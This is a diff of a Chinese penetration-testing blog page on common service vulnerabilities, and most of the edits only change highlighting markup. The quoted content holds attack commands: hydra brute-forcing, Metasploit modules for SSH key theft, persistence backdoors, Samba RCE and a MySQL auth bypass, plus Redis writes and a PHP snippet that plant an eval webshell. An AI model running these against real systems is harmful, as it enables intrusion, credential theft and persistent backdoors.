@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/www.geekby.site\/2020\/05\/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E\/"
-        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试, 服务漏洞","wordcount":  962 ,
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试, 服务漏洞","wordcount":  961 ,
         "url": "https:\/\/www.geekby.site\/2020\/05\/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E\/","datePublished": "2020-05-13T15:09:00+08:00","dateModified": "2020-05-13T15:09:00+08:00","publisher": {
             "@type": "Organization",
             "name": "Geekby","logo": {
@@ -109,7 +109,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">常见服务类漏洞</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-13">2020-05-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 962 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-13">2020-05-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 961 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -298,8 +298,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">scanner/ftp/anonymous 模块
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">scanner/ftp/anonymous 模块
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="中间人嗅探">中间人嗅探</h3>
 <p>攻击者可以利用嗅探工具来帮助他们嗅探网络中服务器和客户端之间传输的数据包并检索凭据，这被称为嗅探，然后将其用于未经授权的访问。如上所述，FTP用户可以使用用于用户名和密码的明文登录协议对自己进行身份验证。</p>
@@ -310,8 +310,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">hydra -v -L user.txt -P pass.txt ftp://ip
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">hydra -v -L user.txt -P pass.txt ftp://ip
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="msf-1">MSF</h4>
 <div class="highlight"><div class="chroma">
@@ -319,8 +319,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">auxiliary/scanner/ftp/ftp_login
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">auxiliary/scanner/ftp/ftp_login
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="vsftpd-笑脸漏洞">vsftpd 笑脸漏洞</h3>
 <p>版本：<code>vsftp 2.3.4</code></p>
@@ -351,8 +351,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nmap -sV -p 22 IP
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap -sV -p 22 IP
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="msf-2">msf</h4>
 <div class="highlight"><div class="chroma">
@@ -360,8 +360,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">auxiliary/scanner/ssh/ssh_version
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">auxiliary/scanner/ssh/ssh_version
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="密码破解">密码破解</h3>
 <h4 id="msf-3">msf</h4>
@@ -371,9 +371,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/scanner/ssh/ssh_login
-set stop_on_success true
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/ssh/ssh_login
+</span></span><span class="line"><span class="cl">set stop_on_success true
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="ssh-用户代码执行">SSH 用户代码执行</h3>
 <h4 id="msf-4">msf</h4>
@@ -382,8 +382,8 @@ set stop_on_success true
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use exploit/multi/ssh/sshexec
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use exploit/multi/ssh/sshexec
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="使用-rsa-密钥建立-ssh-连接">使用 RSA 密钥建立 SSH 连接</h3>
 <p>配置：</p>
@@ -399,15 +399,15 @@ set stop_on_success true
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen
-<span class="nb">cd</span> /home/kali/.ssh
-ls
-cat id_rsa.pub &gt; authorized_keys
-scp msfadmin@ip:/home/msfadmin/.ssh/id_rsa ./
-sudo vim /etc/ssh/sshd_config
-PasswordAuthentication no
-sudo /etc/init.d/ssh restart
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh-keygen
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/kali/.ssh
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">cat id_rsa.pub &gt; authorized_keys
+</span></span><span class="line"><span class="cl">scp msfadmin@ip:/home/msfadmin/.ssh/id_rsa ./
+</span></span><span class="line"><span class="cl">sudo vim /etc/ssh/sshd_config
+</span></span><span class="line"><span class="cl">PasswordAuthentication no
+</span></span><span class="line"><span class="cl">sudo /etc/init.d/ssh restart
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>连接：</p>
 <div class="highlight"><div class="chroma">
@@ -415,8 +415,8 @@ sudo /etc/init.d/ssh restart
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -i id_rsa username@ip
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -i id_rsa username@ip
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="窃取-ssh-密钥">窃取 SSH 密钥</h3>
 <p>已获得 meterpreter 会话，窃取 SSH 密钥</p>
@@ -428,11 +428,11 @@ sudo /etc/init.d/ssh restart
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/scanner/ssh/ssh_login 获取会话
-use post/multi/gather/ssh_creds
-set session 1
-run
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/ssh/ssh_login 获取会话
+</span></span><span class="line"><span class="cl">use post/multi/gather/ssh_creds
+</span></span><span class="line"><span class="cl">set session 1
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="ssh-密钥持久性后门">SSH 密钥持久性后门</h3>
 <p>已获得 meterpreter 会话，留下 SSH 密钥持久性后门</p>
@@ -444,11 +444,11 @@ run
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/scanner/ssh/ssh_login 获取会话
-use post/linux/manager/sshkey_persistence
-set session 1
-run
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/ssh/ssh_login 获取会话
+</span></span><span class="line"><span class="cl">use post/linux/manager/sshkey_persistence
+</span></span><span class="line"><span class="cl">set session 1
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="防御-1">防御</h3>
 <h4 id="修改默认端口">修改默认端口</h4>
@@ -459,10 +459,10 @@ run
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo vim /etc/ssh/sshd_config
-port <span class="m">22222</span>
-sudo /etc/init.d/ssh restart
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo vim /etc/ssh/sshd_config
+</span></span><span class="line"><span class="cl">port <span class="m">22222</span>
+</span></span><span class="line"><span class="cl">sudo /etc/init.d/ssh restart
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="telnet-漏洞">Telnet 漏洞</h2>
 <h3 id="telnet-简介">telnet 简介</h3>
@@ -498,8 +498,8 @@ sudo /etc/init.d/ssh restart
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">hydra -v -L user.txt -P pass.txt telnet://IP
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">hydra -v -L user.txt -P pass.txt telnet://IP
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="msf-5">msf</h4>
 <div class="highlight"><div class="chroma">
@@ -512,13 +512,13 @@ sudo /etc/init.d/ssh restart
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">use auxiliary/scanner/telnet/telnet_login
-<span class="k">set</span> <span class="nv">rhost</span>
-<span class="k">set</span> <span class="nv">stop_on_success true</span>
-<span class="k">set</span> <span class="nv">user_file user.txt</span>
-<span class="k">set</span> <span class="nv">pass_file pass.txt</span>
-run
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">use auxiliary/scanner/telnet/telnet_login
+</span></span><span class="line"><span class="cl"><span class="k">set</span> <span class="nv">rhost</span>
+</span></span><span class="line"><span class="cl"><span class="k">set</span> <span class="nv">stop_on_success true</span>
+</span></span><span class="line"><span class="cl"><span class="k">set</span> <span class="nv">user_file user.txt</span>
+</span></span><span class="line"><span class="cl"><span class="k">set</span> <span class="nv">pass_file pass.txt</span>
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="保护-telnet-免受暴力攻击">保护 telnet 免受暴力攻击</h3>
 <ul>
@@ -529,8 +529,8 @@ run
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo iptables -A INPUT -s 192.168.1.1 -p tcp --dport <span class="m">23</span> -j ACCEPT
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo iptables -A INPUT -s 192.168.1.1 -p tcp --dport <span class="m">23</span> -j ACCEPT
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>drop 掉来自端口 23 上其它 IP 地址的流量</li>
@@ -540,8 +540,8 @@ run
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo iptables -A INPUT -p tcp --dport <span class="m">23</span> -j DROP
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo iptables -A INPUT -p tcp --dport <span class="m">23</span> -j DROP
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="smtp-漏洞">SMTP 漏洞</h2>
 <h3 id="smtp-简介">SMTP 简介</h3>
@@ -619,12 +619,12 @@ run
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">apt-get install smtp-user-enum
-smtp-user-enum -M VRFY -u root -t 202.38.xxx.xxx
-smtp-user-enum -M VRFY -U dic.txt -t 202.38.xxx.xxx
-smtp-user-enum -M RCPT -u bin -t 202.38.xxx.xxx
-smtp-user-enum -M EXPN -u bin -t 202.38.xxx.xxx
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">apt-get install smtp-user-enum
+</span></span><span class="line"><span class="cl">smtp-user-enum -M VRFY -u root -t 202.38.xxx.xxx
+</span></span><span class="line"><span class="cl">smtp-user-enum -M VRFY -U dic.txt -t 202.38.xxx.xxx
+</span></span><span class="line"><span class="cl">smtp-user-enum -M RCPT -u bin -t 202.38.xxx.xxx
+</span></span><span class="line"><span class="cl">smtp-user-enum -M EXPN -u bin -t 202.38.xxx.xxx
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="msf-6">msf</h4>
 <div class="highlight"><div class="chroma">
@@ -632,8 +632,8 @@ smtp-user-enum -M EXPN -u bin -t 202.38.xxx.xxx
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">auxiliary/scanner/smtp/smtp_enum
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">auxiliary/scanner/smtp/smtp_enum
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="暴力破解-1">暴力破解</h3>
 <h4 id="hydra-2">hydra</h4>
@@ -642,8 +642,8 @@ smtp-user-enum -M EXPN -u bin -t 202.38.xxx.xxx
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hydra -l msfadmin -P passwd.txt smtp://IP
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -l msfadmin -P passwd.txt smtp://IP
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="samba-漏洞">Samba 漏洞</h2>
 <h3 id="samba-简介">Samba 简介</h3>
@@ -658,8 +658,8 @@ smtp-user-enum -M EXPN -u bin -t 202.38.xxx.xxx
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">auxiliary/scanner/smb/smb_version
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">auxiliary/scanner/smb/smb_version
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="nmap-1">nmap</h4>
 <div class="highlight"><div class="chroma">
@@ -668,9 +668,9 @@ smtp-user-enum -M EXPN -u bin -t 202.38.xxx.xxx
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -p <span class="m">445</span> IP
-nmap -sV -v -p <span class="m">445</span> --script<span class="o">=</span>smb-vuln*
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV -p <span class="m">445</span> IP
+</span></span><span class="line"><span class="cl">nmap -sV -v -p <span class="m">445</span> --script<span class="o">=</span>smb-vuln*
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="nmblookup">nmblookup</h4>
 <p>nmblookup 用于查询 NetBIOS 名称，并使用基于 TCP/IP 的 NetBIOS 查询将它们映射到网络中的 IP 地址。这些选项允许将名称查询定向到特定的 IP 广播区域或特定的机器。所有查询都通过 UDP 完成。</p>
@@ -680,8 +680,8 @@ nmap -sV -v -p <span class="m">445</span> --script<span class="o">=</span>smb-vu
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nmblookup -A 192.168.1.139
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">nmblookup -A 192.168.1.139
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="nbtscan">nbtscan</h4>
 <p>扫描在本地或远程 TCP/IP 网络上 NetBIOS 打开的名称服务器，因为这是查找打开共享的第一步</p>
@@ -691,8 +691,8 @@ nmap -sV -v -p <span class="m">445</span> --script<span class="o">=</span>smb-vu
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nbtscan 192.168.1.1/24
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">nbtscan 192.168.1.1/24
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="smbmap">SMBMap</h4>
 <p>SMBMap 允许用户枚举整个域中的 samba 共享驱动器。列出共享驱动器，驱动器权限，共享内容，上载/下载功能，文件名自动下载模式匹配，甚至执行远程命令。旨在简化大型网络中潜在敏感数据的搜索。</p>
@@ -702,9 +702,9 @@ nmap -sV -v -p <span class="m">445</span> --script<span class="o">=</span>smb-vu
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">smbmap -H 192.168.1.139
-smbmap -H 192.168.1.139 -u msfadmin -p msfadmin
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">smbmap -H 192.168.1.139
+</span></span><span class="line"><span class="cl">smbmap -H 192.168.1.139 -u msfadmin -p msfadmin
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="暴力破解-2">暴力破解</h3>
 <h4 id="hydra-3">hydra</h4>
@@ -713,8 +713,8 @@ smbmap -H 192.168.1.139 -u msfadmin -p msfadmin
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">hydra -L user.txt -P pass.txt -v smb://ip
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">hydra -L user.txt -P pass.txt -v smb://ip
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="命令执行">命令执行</h3>
 <div class="highlight"><div class="chroma">
@@ -723,9 +723,9 @@ smbmap -H 192.168.1.139 -u msfadmin -p msfadmin
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">search smb 3.0.20
-use exploit/multi/samba/usermap_script
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">search smb 3.0.20
+</span></span><span class="line"><span class="cl">use exploit/multi/samba/usermap_script
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="zookeeper">Zookeeper</h2>
 <h3 id="zookeeper-简介">Zookeeper 简介</h3>
@@ -739,11 +739,11 @@ use exploit/multi/samba/usermap_script
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz
-tar -xzvf zookeeper-3.4.14.tar.gz
-mv zoo_sample.cfg zoo.cfg
-./zkServer.sh start
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz
+</span></span><span class="line"><span class="cl">tar -xzvf zookeeper-3.4.14.tar.gz
+</span></span><span class="line"><span class="cl">mv zoo_sample.cfg zoo.cfg
+</span></span><span class="line"><span class="cl">./zkServer.sh start
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="未授权访问">未授权访问</h3>
 <p>Zookeeper 默认未设置密码，在未进行任何访问控制情况下，攻击者可通过执行 env 命令获得系统大量的敏感信息，包括系统名称、Java 环境。</p>
@@ -754,17 +754,17 @@ mv zoo_sample.cfg zoo.cfg
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">netstat -an <span class="p">|</span> grep 2181
-nmap -sV -p 2181 IP
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">netstat -an <span class="p">|</span> grep 2181
+</span></span><span class="line"><span class="cl">nmap -sV -p 2181 IP
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nc IP 2181
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">nc IP 2181
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>envi
@@ -811,11 +811,11 @@ nmap -sV -p 2181 IP
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nmap:
-nmap -sV -p 3306 IP
-msf:
-use auxiliary/scanner/mysql/mysql_version
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">nmap:
+</span></span><span class="line"><span class="cl">nmap -sV -p 3306 IP
+</span></span><span class="line"><span class="cl">msf:
+</span></span><span class="line"><span class="cl">use auxiliary/scanner/mysql/mysql_version
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="其它相关信息">其它相关信息</h4>
 <div class="highlight"><div class="chroma">
@@ -823,8 +823,8 @@ use auxiliary/scanner/mysql/mysql_version
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/admin/mysql/mysql_enum
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/admin/mysql/mysql_enum
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="mysql-密码破解">Mysql 密码破解</h3>
 <h4 id="hydra-4">hydra</h4>
@@ -833,8 +833,8 @@ use auxiliary/scanner/mysql/mysql_version
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">hydra -L user.txt -P password.txt -v mysql://IP
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">hydra -L user.txt -P password.txt -v mysql://IP
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="msf-8">msf</h4>
 <div class="highlight"><div class="chroma">
@@ -842,8 +842,8 @@ use auxiliary/scanner/mysql/mysql_version
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/scanner/mysql/mysql_login
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/mysql/mysql_login
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="mysql-漏洞利用">Mysql 漏洞利用</h3>
 <h4 id="mysql-身份认证漏洞cve-2012-2122">MySQL 身份认证漏洞(CVE-2012-2122)</h4>
@@ -865,8 +865,8 @@ use auxiliary/scanner/mysql/mysql_version
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/scanner/mysql/mysql_authbypass_hashdump
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Linux shell:</p>
 <div class="highlight"><div class="chroma">
@@ -874,8 +874,8 @@ use auxiliary/scanner/mysql/mysql_version
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1</span> 1000<span class="sb">`</span><span class="p">;</span><span class="k">do</span> mysql -uroot -pwrong -h IP -P3306<span class="p">;</span><span class="k">done</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1</span> 1000<span class="sb">`</span><span class="p">;</span><span class="k">do</span> mysql -uroot -pwrong -h IP -P3306<span class="p">;</span><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="redis">Redis</h2>
 <h3 id="redis-简介">redis 简介</h3>
@@ -890,15 +890,13 @@ use auxiliary/scanner/mysql/mysql_version
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
-</span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">config <span class="nb">set</span> dir /var/www/html
-config <span class="nb">set</span> dbfilename webshell.php
-<span class="nb">set</span> webshell <span class="s2">&#34;&lt;?php phpinfo();?&gt;&#34;</span>
-save
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">config <span class="nb">set</span> dir /var/www/html
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename webshell.php
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> webshell <span class="s2">&#34;&lt;?php phpinfo();?&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">save
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -919,13 +917,13 @@ save
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
-<span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="nv">$fp</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;webshell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">);</span>
-<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s1">&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;</span><span class="p">);</span>
-<span class="k">exit</span><span class="p">();</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$fp</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;webshell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">);</span>
